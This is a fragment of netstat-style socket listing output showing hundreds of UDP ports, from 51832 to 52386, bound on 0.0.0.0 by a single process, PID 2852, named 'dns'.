  UDP        0.0.0.0               51832         *:*                            2852              dns
  UDP        0.0.0.0               51833         *:*                            2852              dns
  UDP        0.0.0.0               51834         *:*                            2852              dns
  UDP        0.0.0.0               51835         *:*                            2852              dns
  UDP        0.0.0.0               51836         *:*                            2852              dns
  UDP        0.0.0.0               51837         *:*                            2852              dns
  UDP        0.0.0.0               51838         *:*                            2852              dns
  UDP        0.0.0.0               51839         *:*                            2852              dns
  UDP        0.0.0.0               51840         *:*                            2852              dns
  UDP        0.0.0.0               51841         *:*                            2852              dns
  UDP        0.0.0.0               51842         *:*                            2852              dns
  UDP        0.0.0.0               51843         *:*                            2852              dns
  UDP        0.0.0.0               51844         *:*                            2852              dns
  UDP        0.0.0.0               51845         *:*                            2852              dns
  UDP        0.0.0.0               51846         *:*                            2852              dns
  UDP        0.0.0.0               51847         *:*                            2852              dns
  UDP        0.0.0.0               51848         *:*                            2852              dns
  UDP        0.0.0.0               51849         *:*                            2852              dns
  UDP        0.0.0.0               51850         *:*                            2852              dns
  UDP        0.0.0.0               51851         *:*                            2852              dns
  UDP        0.0.0.0               51852         *:*                            2852              dns
  UDP        0.0.0.0               51853         *:*                            2852              dns
  UDP        0.0.0.0               51854         *:*                            2852              dns
  UDP        0.0.0.0               51855         *:*                            2852              dns
  UDP        0.0.0.0               51856         *:*                            2852              dns
  UDP        0.0.0.0               51857         *:*                            2852              dns
  UDP        0.0.0.0               51858         *:*                            2852              dns
  UDP        0.0.0.0               51859         *:*                            2852              dns
  UDP        0.0.0.0               51860         *:*                            2852              dns
  UDP        0.0.0.0               51861         *:*                            2852              dns
  UDP        0.0.0.0               51862         *:*                            2852              dns
  UDP        0.0.0.0               51863         *:*                            2852              dns
  UDP        0.0.0.0               51864         *:*                            2852              dns
  UDP        0.0.0.0               51865         *:*                            2852              dns
  UDP        0.0.0.0               51866         *:*                            2852              dns
  UDP        0.0.0.0               51867         *:*                            2852              dns
  UDP        0.0.0.0               51868         *:*                            2852              dns
  UDP        0.0.0.0               51869         *:*                            2852              dns
  UDP        0.0.0.0               51870         *:*                            2852              dns
  UDP        0.0.0.0               51871         *:*                            2852              dns
  UDP        0.0.0.0               51872         *:*                            2852              dns
  UDP        0.0.0.0               51873         *:*                            2852              dns
  UDP        0.0.0.0               51874         *:*                            2852              dns
  UDP        0.0.0.0               51875         *:*                            2852              dns
  UDP        0.0.0.0               51876         *:*                            2852              dns
  UDP        0.0.0.0               51877         *:*                            2852              dns
  UDP        0.0.0.0               51878         *:*                            2852              dns
  UDP        0.0.0.0               51879         *:*                            2852              dns
  UDP        0.0.0.0               51880         *:*                            2852              dns
  UDP        0.0.0.0               51881         *:*                            2852              dns
  UDP        0.0.0.0               51882         *:*                            2852              dns
  UDP        0.0.0.0               51883         *:*                            2852              dns
  UDP        0.0.0.0               51884         *:*                            2852              dns
  UDP        0.0.0.0               51885         *:*                            2852              dns
  UDP        0.0.0.0               51886         *:*                            2852              dns
  UDP        0.0.0.0               51887         *:*                            2852              dns
  UDP        0.0.0.0               51888         *:*                            2852              dns
  UDP        0.0.0.0               51889         *:*                            2852              dns
  UDP        0.0.0.0               51890         *:*                            2852              dns
  UDP        0.0.0.0               51891         *:*                            2852              dns
  UDP        0.0.0.0               51892         *:*                            2852              dns
  UDP        0.0.0.0               51893         *:*                            2852              dns
  UDP        0.0.0.0               51894         *:*                            2852              dns
  UDP        0.0.0.0               51895         *:*                            2852              dns
  UDP        0.0.0.0               51896         *:*                            2852              dns
  UDP        0.0.0.0               51897         *:*                            2852              dns
  UDP        0.0.0.0               51898         *:*                            2852              dns
  UDP        0.0.0.0               51899         *:*                            2852              dns
  UDP        0.0.0.0               51900         *:*                            2852              dns
  UDP        0.0.0.0               51901         *:*                            2852              dns
  UDP        0.0.0.0               51902         *:*                            2852              dns
  UDP        0.0.0.0               51903         *:*                            2852              dns
  UDP        0.0.0.0               51904         *:*                            2852              dns
  UDP        0.0.0.0               51905         *:*                            2852              dns
  UDP        0.0.0.0               51906         *:*                            2852              dns
  UDP        0.0.0.0               51907         *:*                            2852              dns
  UDP        0.0.0.0               51908         *:*                            2852              dns
  UDP        0.0.0.0               51909         *:*                            2852              dns
  UDP        0.0.0.0               51910         *:*                            2852              dns
  UDP        0.0.0.0               51911         *:*                            2852              dns
  UDP        0.0.0.0               51912         *:*                            2852              dns
  UDP        0.0.0.0               51913         *:*                            2852              dns
  UDP        0.0.0.0               51914         *:*                            2852              dns
  UDP        0.0.0.0               51915         *:*                            2852              dns
  UDP        0.0.0.0               51916         *:*                            2852              dns
  UDP        0.0.0.0               51917         *:*                            2852              dns
  UDP        0.0.0.0               51918         *:*                            2852              dns
  UDP        0.0.0.0               51919         *:*                            2852              dns
  UDP        0.0.0.0               51920         *:*                            2852              dns
  UDP        0.0.0.0               51921         *:*                            2852              dns
  UDP        0.0.0.0               51922         *:*                            2852              dns
  UDP        0.0.0.0               51923         *:*                            2852              dns
  UDP        0.0.0.0               51924         *:*                            2852              dns
  UDP        0.0.0.0               51925         *:*                            2852              dns
  UDP        0.0.0.0               51926         *:*                            2852              dns
  UDP        0.0.0.0               51927         *:*                            2852              dns
  UDP        0.0.0.0               51928         *:*                            2852              dns
  UDP        0.0.0.0               51929         *:*                            2852              dns
  UDP        0.0.0.0               51930         *:*                            2852              dns
  UDP        0.0.0.0               51931         *:*                            2852              dns
  UDP        0.0.0.0               51932         *:*                            2852              dns
  UDP        0.0.0.0               51933         *:*                            2852              dns
  UDP        0.0.0.0               51934         *:*                            2852              dns
  UDP        0.0.0.0               51935         *:*                            2852              dns
  UDP        0.0.0.0               51936         *:*                            2852              dns
  UDP        0.0.0.0               51937         *:*                            2852              dns
  UDP        0.0.0.0               51938         *:*                            2852              dns
  UDP        0.0.0.0               51939         *:*                            2852              dns
  UDP        0.0.0.0               51940         *:*                            2852              dns
  UDP        0.0.0.0               51941         *:*                            2852              dns
  UDP        0.0.0.0               51942         *:*                            2852              dns
  UDP        0.0.0.0               51943         *:*                            2852              dns
  UDP        0.0.0.0               51944         *:*                            2852              dns
  UDP        0.0.0.0               51945         *:*                            2852              dns
  UDP        0.0.0.0               51946         *:*                            2852              dns
  UDP        0.0.0.0               51947         *:*                            2852              dns
  UDP        0.0.0.0               51948         *:*                            2852              dns
  UDP        0.0.0.0               51949         *:*                            2852              dns
  UDP        0.0.0.0               51950         *:*                            2852              dns
  UDP        0.0.0.0               51951         *:*                            2852              dns
  UDP        0.0.0.0               51952         *:*                            2852              dns
  UDP        0.0.0.0               51953         *:*                            2852              dns
  UDP        0.0.0.0               51954         *:*                            2852              dns
  UDP        0.0.0.0               51955         *:*                            2852              dns
  UDP        0.0.0.0               51956         *:*                            2852              dns
  UDP        0.0.0.0               51957         *:*                            2852              dns
  UDP        0.0.0.0               51958         *:*                            2852              dns
  UDP        0.0.0.0               51959         *:*                            2852              dns
  UDP        0.0.0.0               51960         *:*                            2852              dns
  UDP        0.0.0.0               51961         *:*                            2852              dns
  UDP        0.0.0.0               51962         *:*                            2852              dns
  UDP        0.0.0.0               51963         *:*                            2852              dns
  UDP        0.0.0.0               51964         *:*                            2852              dns
  UDP        0.0.0.0               51965         *:*                            2852              dns
  UDP        0.0.0.0               51966         *:*                            2852              dns
  UDP        0.0.0.0               51967         *:*                            2852              dns
  UDP        0.0.0.0               51968         *:*                            2852              dns
  UDP        0.0.0.0               51969         *:*                            2852              dns
  UDP        0.0.0.0               51970         *:*                            2852              dns
  UDP        0.0.0.0               51971         *:*                            2852              dns
  UDP        0.0.0.0               51972         *:*                            2852              dns
  UDP        0.0.0.0               51973         *:*                            2852              dns
  UDP        0.0.0.0               51974         *:*                            2852              dns
  UDP        0.0.0.0               51975         *:*                            2852              dns
  UDP        0.0.0.0               51976         *:*                            2852              dns
  UDP        0.0.0.0               51977         *:*                            2852              dns
  UDP        0.0.0.0               51978         *:*                            2852              dns
  UDP        0.0.0.0               51979         *:*                            2852              dns
  UDP        0.0.0.0               51980         *:*                            2852              dns
  UDP        0.0.0.0               51981         *:*                            2852              dns
  UDP        0.0.0.0               51982         *:*                            2852              dns
  UDP        0.0.0.0               51983         *:*                            2852              dns
  UDP        0.0.0.0               51984         *:*                            2852              dns
  UDP        0.0.0.0               51985         *:*                            2852              dns
  UDP        0.0.0.0               51986         *:*                            2852              dns
  UDP        0.0.0.0               51987         *:*                            2852              dns
  UDP        0.0.0.0               51988         *:*                            2852              dns
  UDP        0.0.0.0               51989         *:*                            2852              dns
  UDP        0.0.0.0               51990         *:*                            2852              dns
  UDP        0.0.0.0               51991         *:*                            2852              dns
  UDP        0.0.0.0               51992         *:*                            2852              dns
  UDP        0.0.0.0               51993         *:*                            2852              dns
  UDP        0.0.0.0               51994         *:*                            2852              dns
  UDP        0.0.0.0               51995         *:*                            2852              dns
  UDP        0.0.0.0               51996         *:*                            2852              dns
  UDP        0.0.0.0               51997         *:*                            2852              dns
  UDP        0.0.0.0               51998         *:*                            2852              dns
  UDP        0.0.0.0               51999         *:*                            2852              dns
  UDP        0.0.0.0               52000         *:*                            2852              dns
  UDP        0.0.0.0               52001         *:*                            2852              dns
  UDP        0.0.0.0               52002         *:*                            2852              dns
  UDP        0.0.0.0               52003         *:*                            2852              dns
  UDP        0.0.0.0               52004         *:*                            2852              dns
  UDP        0.0.0.0               52005         *:*                            2852              dns
  UDP        0.0.0.0               52006         *:*                            2852              dns
  UDP        0.0.0.0               52007         *:*                            2852              dns
  UDP        0.0.0.0               52008         *:*                            2852              dns
  UDP        0.0.0.0               52009         *:*                            2852              dns
  UDP        0.0.0.0               52010         *:*                            2852              dns
  UDP        0.0.0.0               52011         *:*                            2852              dns
  UDP        0.0.0.0               52012         *:*                            2852              dns
  UDP        0.0.0.0               52013         *:*                            2852              dns
  UDP        0.0.0.0               52014         *:*                            2852              dns
  UDP        0.0.0.0               52015         *:*                            2852              dns
  UDP        0.0.0.0               52016         *:*                            2852              dns
  UDP        0.0.0.0               52017         *:*                            2852              dns
  UDP        0.0.0.0               52018         *:*                            2852              dns
  UDP        0.0.0.0               52019         *:*                            2852              dns
  UDP        0.0.0.0               52020         *:*                            2852              dns
  UDP        0.0.0.0               52021         *:*                            2852              dns
  UDP        0.0.0.0               52022         *:*                            2852              dns
  UDP        0.0.0.0               52023         *:*                            2852              dns
  UDP        0.0.0.0               52024         *:*                            2852              dns
  UDP        0.0.0.0               52025         *:*                            2852              dns
  UDP        0.0.0.0               52026         *:*                            2852              dns
  UDP        0.0.0.0               52027         *:*                            2852              dns
  UDP        0.0.0.0               52028         *:*                            2852              dns
  UDP        0.0.0.0               52029         *:*                            2852              dns
  UDP        0.0.0.0               52030         *:*                            2852              dns
  UDP        0.0.0.0               52031         *:*                            2852              dns
  UDP        0.0.0.0               52032         *:*                            2852              dns
  UDP        0.0.0.0               52033         *:*                            2852              dns
  UDP        0.0.0.0               52034         *:*                            2852              dns
  UDP        0.0.0.0               52035         *:*                            2852              dns
  UDP        0.0.0.0               52036         *:*                            2852              dns
  UDP        0.0.0.0               52037         *:*                            2852              dns
  UDP        0.0.0.0               52038         *:*                            2852              dns
  UDP        0.0.0.0               52039         *:*                            2852              dns
  UDP        0.0.0.0               52040         *:*                            2852              dns
  UDP        0.0.0.0               52041         *:*                            2852              dns
  UDP        0.0.0.0               52042         *:*                            2852              dns
  UDP        0.0.0.0               52043         *:*                            2852              dns
  UDP        0.0.0.0               52044         *:*                            2852              dns
  UDP        0.0.0.0               52045         *:*                            2852              dns
  UDP        0.0.0.0               52046         *:*                            2852              dns
  UDP        0.0.0.0               52047         *:*                            2852              dns
  UDP        0.0.0.0               52048         *:*                            2852              dns
  UDP        0.0.0.0               52049         *:*                            2852              dns
  UDP        0.0.0.0               52050         *:*                            2852              dns
  UDP        0.0.0.0               52051         *:*                            2852              dns
  UDP        0.0.0.0               52052         *:*                            2852              dns
  UDP        0.0.0.0               52053         *:*                            2852              dns
  UDP        0.0.0.0               52054         *:*                            2852              dns
  UDP        0.0.0.0               52055         *:*                            2852              dns
  UDP        0.0.0.0               52056         *:*                            2852              dns
  UDP        0.0.0.0               52057         *:*                            2852              dns
  UDP        0.0.0.0               52058         *:*                            2852              dns
  UDP        0.0.0.0               52059         *:*                            2852              dns
  UDP        0.0.0.0               52060         *:*                            2852              dns
  UDP        0.0.0.0               52061         *:*                            2852              dns
  UDP        0.0.0.0               52062         *:*                            2852              dns
  UDP        0.0.0.0               52063         *:*                            2852              dns
  UDP        0.0.0.0               52064         *:*                            2852              dns
  UDP        0.0.0.0               52065         *:*                            2852              dns
  UDP        0.0.0.0               52066         *:*                            2852              dns
  UDP        0.0.0.0               52067         *:*                            2852              dns
  UDP        0.0.0.0               52068         *:*                            2852              dns
  UDP        0.0.0.0               52069         *:*                            2852              dns
  UDP        0.0.0.0               52070         *:*                            2852              dns
  UDP        0.0.0.0               52071         *:*                            2852              dns
  UDP        0.0.0.0               52072         *:*                            2852              dns
  UDP        0.0.0.0               52073         *:*                            2852              dns
  UDP        0.0.0.0               52074         *:*                            2852              dns
  UDP        0.0.0.0               52075         *:*                            2852              dns
  UDP        0.0.0.0               52076         *:*                            2852              dns
  UDP        0.0.0.0               52077         *:*                            2852              dns
  UDP        0.0.0.0               52078         *:*                            2852              dns
  UDP        0.0.0.0               52079         *:*                            2852              dns
  UDP        0.0.0.0               52080         *:*                            2852              dns
  UDP        0.0.0.0               52081         *:*                            2852              dns
  UDP        0.0.0.0               52082         *:*                            2852              dns
  UDP        0.0.0.0               52083         *:*                            2852              dns
  UDP        0.0.0.0               52084         *:*                            2852              dns
  UDP        0.0.0.0               52085         *:*                            2852              dns
  UDP        0.0.0.0               52086         *:*                            2852              dns
  UDP        0.0.0.0               52087         *:*                            2852              dns
  UDP        0.0.0.0               52088         *:*                            2852              dns
  UDP        0.0.0.0               52089         *:*                            2852              dns
  UDP        0.0.0.0               52090         *:*                            2852              dns
  UDP        0.0.0.0               52091         *:*                            2852              dns
  UDP        0.0.0.0               52092         *:*                            2852              dns
  UDP        0.0.0.0               52093         *:*                            2852              dns
  UDP        0.0.0.0               52094         *:*                            2852              dns
  UDP        0.0.0.0               52095         *:*                            2852              dns
  UDP        0.0.0.0               52096         *:*                            2852              dns
  UDP        0.0.0.0               52097         *:*                            2852              dns
  UDP        0.0.0.0               52098         *:*                            2852              dns
  UDP        0.0.0.0               52099         *:*                            2852              dns
  UDP        0.0.0.0               52100         *:*                            2852              dns
  UDP        0.0.0.0               52101         *:*                            2852              dns
  UDP        0.0.0.0               52102         *:*                            2852              dns
  UDP        0.0.0.0               52103         *:*                            2852              dns
  UDP        0.0.0.0               52104         *:*                            2852              dns
  UDP        0.0.0.0               52105         *:*                            2852              dns
  UDP        0.0.0.0               52106         *:*                            2852              dns
  UDP        0.0.0.0               52107         *:*                            2852              dns
  UDP        0.0.0.0               52108         *:*                            2852              dns
  UDP        0.0.0.0               52109         *:*                            2852              dns
  UDP        0.0.0.0               52110         *:*                            2852              dns
  UDP        0.0.0.0               52111         *:*                            2852              dns
  UDP        0.0.0.0               52112         *:*                            2852              dns
  UDP        0.0.0.0               52113         *:*                            2852              dns
  UDP        0.0.0.0               52114         *:*                            2852              dns
  UDP        0.0.0.0               52115         *:*                            2852              dns
  UDP        0.0.0.0               52116         *:*                            2852              dns
  UDP        0.0.0.0               52117         *:*                            2852              dns
  UDP        0.0.0.0               52118         *:*                            2852              dns
  UDP        0.0.0.0               52119         *:*                            2852              dns
  UDP        0.0.0.0               52120         *:*                            2852              dns
  UDP        0.0.0.0               52121         *:*                            2852              dns
  UDP        0.0.0.0               52122         *:*                            2852              dns
  UDP        0.0.0.0               52123         *:*                            2852              dns
  UDP        0.0.0.0               52124         *:*                            2852              dns
  UDP        0.0.0.0               52125         *:*                            2852              dns
  UDP        0.0.0.0               52126         *:*                            2852              dns
  UDP        0.0.0.0               52127         *:*                            2852              dns
  UDP        0.0.0.0               52128         *:*                            2852              dns
  UDP        0.0.0.0               52129         *:*                            2852              dns
  UDP        0.0.0.0               52130         *:*                            2852              dns
  UDP        0.0.0.0               52131         *:*                            2852              dns
  UDP        0.0.0.0               52132         *:*                            2852              dns
  UDP        0.0.0.0               52133         *:*                            2852              dns
  UDP        0.0.0.0               52134         *:*                            2852              dns
  UDP        0.0.0.0               52135         *:*                            2852              dns
  UDP        0.0.0.0               52136         *:*                            2852              dns
  UDP        0.0.0.0               52137         *:*                            2852              dns
  UDP        0.0.0.0               52138         *:*                            2852              dns
  UDP        0.0.0.0               52139         *:*                            2852              dns
  UDP        0.0.0.0               52140         *:*                            2852              dns
  UDP        0.0.0.0               52141         *:*                            2852              dns
  UDP        0.0.0.0               52142         *:*                            2852              dns
  UDP        0.0.0.0               52143         *:*                            2852              dns
  UDP        0.0.0.0               52144         *:*                            2852              dns
  UDP        0.0.0.0               52145         *:*                            2852              dns
  UDP        0.0.0.0               52146         *:*                            2852              dns
  UDP        0.0.0.0               52147         *:*                            2852              dns
  UDP        0.0.0.0               52148         *:*                            2852              dns
  UDP        0.0.0.0               52149         *:*                            2852              dns
  UDP        0.0.0.0               52150         *:*                            2852              dns
  UDP        0.0.0.0               52151         *:*                            2852              dns
  UDP        0.0.0.0               52152         *:*                            2852              dns
  UDP        0.0.0.0               52153         *:*                            2852              dns
  UDP        0.0.0.0               52154         *:*                            2852              dns
  UDP        0.0.0.0               52155         *:*                            2852              dns
  UDP        0.0.0.0               52156         *:*                            2852              dns
  UDP        0.0.0.0               52157         *:*                            2852              dns
  UDP        0.0.0.0               52158         *:*                            2852              dns
  UDP        0.0.0.0               52159         *:*                            2852              dns
  UDP        0.0.0.0               52160         *:*                            2852              dns
  UDP        0.0.0.0               52161         *:*                            2852              dns
  UDP        0.0.0.0               52162         *:*                            2852              dns
  UDP        0.0.0.0               52163         *:*                            2852              dns
  UDP        0.0.0.0               52164         *:*                            2852              dns
  UDP        0.0.0.0               52165         *:*                            2852              dns
  UDP        0.0.0.0               52166         *:*                            2852              dns
  UDP        0.0.0.0               52167         *:*                            2852              dns
  UDP        0.0.0.0               52168         *:*                            2852              dns
  UDP        0.0.0.0               52169         *:*                            2852              dns
  UDP        0.0.0.0               52170         *:*                            2852              dns
  UDP        0.0.0.0               52171         *:*                            2852              dns
  UDP        0.0.0.0               52172         *:*                            2852              dns
  UDP        0.0.0.0               52173         *:*                            2852              dns
  UDP        0.0.0.0               52174         *:*                            2852              dns
  UDP        0.0.0.0               52175         *:*                            2852              dns
  UDP        0.0.0.0               52176         *:*                            2852              dns
  UDP        0.0.0.0               52177         *:*                            2852              dns
  UDP        0.0.0.0               52178         *:*                            2852              dns
  UDP        0.0.0.0               52179         *:*                            2852              dns
  UDP        0.0.0.0               52180         *:*                            2852              dns
  UDP        0.0.0.0               52181         *:*                            2852              dns
  UDP        0.0.0.0               52182         *:*                            2852              dns
  UDP        0.0.0.0               52183         *:*                            2852              dns
  UDP        0.0.0.0               52184         *:*                            2852              dns
  UDP        0.0.0.0               52185         *:*                            2852              dns
  UDP        0.0.0.0               52186         *:*                            2852              dns
  UDP        0.0.0.0               52187         *:*                            2852              dns
  UDP        0.0.0.0               52188         *:*                            2852              dns
  UDP        0.0.0.0               52189         *:*                            2852              dns
  UDP        0.0.0.0               52190         *:*                            2852              dns
  UDP        0.0.0.0               52191         *:*                            2852              dns
  UDP        0.0.0.0               52192         *:*                            2852              dns
  UDP        0.0.0.0               52193         *:*                            2852              dns
  UDP        0.0.0.0               52194         *:*                            2852              dns
  UDP        0.0.0.0               52195         *:*                            2852              dns
  UDP        0.0.0.0               52196         *:*                            2852              dns
  UDP        0.0.0.0               52197         *:*                            2852              dns
  UDP        0.0.0.0               52198         *:*                            2852              dns
  UDP        0.0.0.0               52199         *:*                            2852              dns
  UDP        0.0.0.0               52200         *:*                            2852              dns
  UDP        0.0.0.0               52201         *:*                            2852              dns
  UDP        0.0.0.0               52202         *:*                            2852              dns
  UDP        0.0.0.0               52203         *:*                            2852              dns
  UDP        0.0.0.0               52204         *:*                            2852              dns
  UDP        0.0.0.0               52205         *:*                            2852              dns
  UDP        0.0.0.0               52206         *:*                            2852              dns
  UDP        0.0.0.0               52207         *:*                            2852              dns
  UDP        0.0.0.0               52208         *:*                            2852              dns
  UDP        0.0.0.0               52209         *:*                            2852              dns
  UDP        0.0.0.0               52210         *:*                            2852              dns
  UDP        0.0.0.0               52211         *:*                            2852              dns
  UDP        0.0.0.0               52212         *:*                            2852              dns
  UDP        0.0.0.0               52213         *:*                            2852              dns
  UDP        0.0.0.0               52214         *:*                            2852              dns
  UDP        0.0.0.0               52215         *:*                            2852              dns
  UDP        0.0.0.0               52216         *:*                            2852              dns
  UDP        0.0.0.0               52217         *:*                            2852              dns
  UDP        0.0.0.0               52218         *:*                            2852              dns
  UDP        0.0.0.0               52219         *:*                            2852              dns
  UDP        0.0.0.0               52220         *:*                            2852              dns
  UDP        0.0.0.0               52221         *:*                            2852              dns
  UDP        0.0.0.0               52222         *:*                            2852              dns
  UDP        0.0.0.0               52223         *:*                            2852              dns
  UDP        0.0.0.0               52224         *:*                            2852              dns
  UDP        0.0.0.0               52225         *:*                            2852              dns
  UDP        0.0.0.0               52226         *:*                            2852              dns
  UDP        0.0.0.0               52227         *:*                            2852              dns
  UDP        0.0.0.0               52228         *:*                            2852              dns
  UDP        0.0.0.0               52229         *:*                            2852              dns
  UDP        0.0.0.0               52230         *:*                            2852              dns
  UDP        0.0.0.0               52231         *:*                            2852              dns
  UDP        0.0.0.0               52232         *:*                            2852              dns
  UDP        0.0.0.0               52233         *:*                            2852              dns
  UDP        0.0.0.0               52234         *:*                            2852              dns
  UDP        0.0.0.0               52235         *:*                            2852              dns
  UDP        0.0.0.0               52236         *:*                            2852              dns
  UDP        0.0.0.0               52237         *:*                            2852              dns
  UDP        0.0.0.0               52238         *:*                            2852              dns
  UDP        0.0.0.0               52239         *:*                            2852              dns
  UDP        0.0.0.0               52240         *:*                            2852              dns
  UDP        0.0.0.0               52241         *:*                            2852              dns
  UDP        0.0.0.0               52242         *:*                            2852              dns
  UDP        0.0.0.0               52243         *:*                            2852              dns
  UDP        0.0.0.0               52244         *:*                            2852              dns
  UDP        0.0.0.0               52245         *:*                            2852              dns
  UDP        0.0.0.0               52246         *:*                            2852              dns
  UDP        0.0.0.0               52247         *:*                            2852              dns
  UDP        0.0.0.0               52248         *:*                            2852              dns
  UDP        0.0.0.0               52249         *:*                            2852              dns
  UDP        0.0.0.0               52250         *:*                            2852              dns
  UDP        0.0.0.0               52251         *:*                            2852              dns
  UDP        0.0.0.0               52252         *:*                            2852              dns
  UDP        0.0.0.0               52253         *:*                            2852              dns
  UDP        0.0.0.0               52254         *:*                            2852              dns
  UDP        0.0.0.0               52255         *:*                            2852              dns
  UDP        0.0.0.0               52256         *:*                            2852              dns
  UDP        0.0.0.0               52257         *:*                            2852              dns
  UDP        0.0.0.0               52258         *:*                            2852              dns
  UDP        0.0.0.0               52259         *:*                            2852              dns
  UDP        0.0.0.0               52260         *:*                            2852              dns
  UDP        0.0.0.0               52261         *:*                            2852              dns
  UDP        0.0.0.0               52262         *:*                            2852              dns
  UDP        0.0.0.0               52263         *:*                            2852              dns
  UDP        0.0.0.0               52264         *:*                            2852              dns
  UDP        0.0.0.0               52265         *:*                            2852              dns
  UDP        0.0.0.0               52266         *:*                            2852              dns
  UDP        0.0.0.0               52267         *:*                            2852              dns
  UDP        0.0.0.0               52268         *:*                            2852              dns
  UDP        0.0.0.0               52269         *:*                            2852              dns
  UDP        0.0.0.0               52270         *:*                            2852              dns
  UDP        0.0.0.0               52271         *:*                            2852              dns
  UDP        0.0.0.0               52272         *:*                            2852              dns
  UDP        0.0.0.0               52273         *:*                            2852              dns
  UDP        0.0.0.0               52274         *:*                            2852              dns
  UDP        0.0.0.0               52275         *:*                            2852              dns
  UDP        0.0.0.0               52276         *:*                            2852              dns
  UDP        0.0.0.0               52277         *:*                            2852              dns
  UDP        0.0.0.0               52278         *:*                            2852              dns
  UDP        0.0.0.0               52279         *:*                            2852              dns
  UDP        0.0.0.0               52280         *:*                            2852              dns
  UDP        0.0.0.0               52281         *:*                            2852              dns
  UDP        0.0.0.0               52282         *:*                            2852              dns
  UDP        0.0.0.0               52283         *:*                            2852              dns
  UDP        0.0.0.0               52284         *:*                            2852              dns
  UDP        0.0.0.0               52285         *:*                            2852              dns
  UDP        0.0.0.0               52286         *:*                            2852              dns
  UDP        0.0.0.0               52287         *:*                            2852              dns
  UDP        0.0.0.0               52288         *:*                            2852              dns
  UDP        0.0.0.0               52289         *:*                            2852              dns
  UDP        0.0.0.0               52290         *:*                            2852              dns
  UDP        0.0.0.0               52291         *:*                            2852              dns
  UDP        0.0.0.0               52292         *:*                            2852              dns
  UDP        0.0.0.0               52293         *:*                            2852              dns
  UDP        0.0.0.0               52294         *:*                            2852              dns
  UDP        0.0.0.0               52295         *:*                            2852              dns
  UDP        0.0.0.0               52296         *:*                            2852              dns
  UDP        0.0.0.0               52297         *:*                            2852              dns
  UDP        0.0.0.0               52298         *:*                            2852              dns
  UDP        0.0.0.0               52299         *:*                            2852              dns
  UDP        0.0.0.0               52300         *:*                            2852              dns
  UDP        0.0.0.0               52301         *:*                            2852              dns
  UDP        0.0.0.0               52302         *:*                            2852              dns
  UDP        0.0.0.0               52303         *:*                            2852              dns
  UDP        0.0.0.0               52304         *:*                            2852              dns
  UDP        0.0.0.0               52305         *:*                            2852              dns
  UDP        0.0.0.0               52306         *:*                            2852              dns
  UDP        0.0.0.0               52307         *:*                            2852              dns
  UDP        0.0.0.0               52308         *:*                            2852              dns
  UDP        0.0.0.0               52309         *:*                            2852              dns
  UDP        0.0.0.0               52310         *:*                            2852              dns
  UDP        0.0.0.0               52311         *:*                            2852              dns
  UDP        0.0.0.0               52312         *:*                            2852              dns
  UDP        0.0.0.0               52313         *:*                            2852              dns
  UDP        0.0.0.0               52314         *:*                            2852              dns
  UDP        0.0.0.0               52315         *:*                            2852              dns
  UDP        0.0.0.0               52316         *:*                            2852              dns
  UDP        0.0.0.0               52317         *:*                            2852              dns
  UDP        0.0.0.0               52318         *:*                            2852              dns
  UDP        0.0.0.0               52319         *:*                            2852              dns
  UDP        0.0.0.0               52320         *:*                            2852              dns
  UDP        0.0.0.0               52321         *:*                            2852              dns
  UDP        0.0.0.0               52322         *:*                            2852              dns
  UDP        0.0.0.0               52323         *:*                            2852              dns
  UDP        0.0.0.0               52324         *:*                            2852              dns
  UDP        0.0.0.0               52325         *:*                            2852              dns
  UDP        0.0.0.0               52326         *:*                            2852              dns
  UDP        0.0.0.0               52327         *:*                            2852              dns
  UDP        0.0.0.0               52328         *:*                            2852              dns
  UDP        0.0.0.0               52329         *:*                            2852              dns
  UDP        0.0.0.0               52330         *:*                            2852              dns
  UDP        0.0.0.0               52331         *:*                            2852              dns
  UDP        0.0.0.0               52332         *:*                            2852              dns
  UDP        0.0.0.0               52333         *:*                            2852              dns
  UDP        0.0.0.0               52334         *:*                            2852              dns
  UDP        0.0.0.0               52335         *:*                            2852              dns
  UDP        0.0.0.0               52336         *:*                            2852              dns
  UDP        0.0.0.0               52337         *:*                            2852              dns
  UDP        0.0.0.0               52338         *:*                            2852              dns
  UDP        0.0.0.0               52339         *:*                            2852              dns
  UDP        0.0.0.0               52340         *:*                            2852              dns
  UDP        0.0.0.0               52341         *:*                            2852              dns
  UDP        0.0.0.0               52342         *:*                            2852              dns
  UDP        0.0.0.0               52343         *:*                            2852              dns
  UDP        0.0.0.0               52344         *:*                            2852              dns
  UDP        0.0.0.0               52345         *:*                            2852              dns
  UDP        0.0.0.0               52346         *:*                            2852              dns
  UDP        0.0.0.0               52347         *:*                            2852              dns
  UDP        0.0.0.0               52348         *:*                            2852              dns
  UDP        0.0.0.0               52349         *:*                            2852              dns
  UDP        0.0.0.0               52350         *:*                            2852              dns
  UDP        0.0.0.0               52351         *:*                            2852              dns
  UDP        0.0.0.0               52352         *:*                            2852              dns
  UDP        0.0.0.0               52353         *:*                            2852              dns
  UDP        0.0.0.0               52354         *:*                            2852              dns
  UDP        0.0.0.0               52355         *:*                            2852              dns
  UDP        0.0.0.0               52356         *:*                            2852              dns
  UDP        0.0.0.0               52357         *:*                            2852              dns
  UDP        0.0.0.0               52358         *:*                            2852              dns
  UDP        0.0.0.0               52359         *:*                            2852              dns
  UDP        0.0.0.0               52360         *:*                            2852              dns
  UDP        0.0.0.0               52361         *:*                            2852              dns
  UDP        0.0.0.0               52362         *:*                            2852              dns
  UDP        0.0.0.0               52363         *:*                            2852              dns
  UDP        0.0.0.0               52364         *:*                            2852              dns
  UDP        0.0.0.0               52365         *:*                            2852              dns
  UDP        0.0.0.0               52366         *:*                            2852              dns
  UDP        0.0.0.0               52367         *:*                            2852              dns
  UDP        0.0.0.0               52368         *:*                            2852              dns
  UDP        0.0.0.0               52369         *:*                            2852              dns
  UDP        0.0.0.0               52370         *:*                            2852              dns
  UDP        0.0.0.0               52371         *:*                            2852              dns
  UDP        0.0.0.0               52372         *:*                            2852              dns
  UDP        0.0.0.0               52373         *:*                            2852              dns
  UDP        0.0.0.0               52374         *:*                            2852              dns
  UDP        0.0.0.0               52375         *:*                            2852              dns
  UDP        0.0.0.0               52376         *:*                            2852              dns
  UDP        0.0.0.0               52377         *:*                            2852              dns
  UDP        0.0.0.0               52378         *:*                            2852              dns
  UDP        0.0.0.0               52379         *:*                            2852              dns
  UDP        0.0.0.0               52380         *:*                            2852              dns
  UDP        0.0.0.0               52381         *:*                            2852              dns
  UDP        0.0.0.0               52382         *:*                            2852              dns
  UDP        0.0.0.0               52383         *:*                            2852              dns
  UDP        0.0.0.0               52384         *:*                            2852              dns
  UDP        0.0.0.0               52385         *:*                            2852              dns
  UDP        0.0.0.0               52386         *:*                            2852              dns
